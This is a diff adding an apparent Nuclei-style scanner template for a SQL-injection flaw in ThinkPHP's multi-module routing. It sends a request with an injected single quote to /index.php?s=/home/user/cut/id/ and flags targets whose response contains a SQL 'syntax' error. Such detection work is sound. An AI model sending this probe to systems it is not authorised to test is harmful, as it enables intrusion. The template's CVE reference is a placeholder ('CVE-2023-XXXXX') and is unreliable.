@@ -1,0 +1,26 @@
+id: thinkphp_multi_sql_leak_3
+
+info:
+  name: "ThinkPHP 多模块 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    A critical SQL injection flaw exists within ThinkPHP's multi-module architecture handling.
+      Attackers can exploit this to execute arbitrary SQL queries via crafted requests.
+      
+      
+      Reference:
+        - https://nvd.nist.gov/vuln/detail/CVE-2023-XXXXX
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/user/cut/id/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
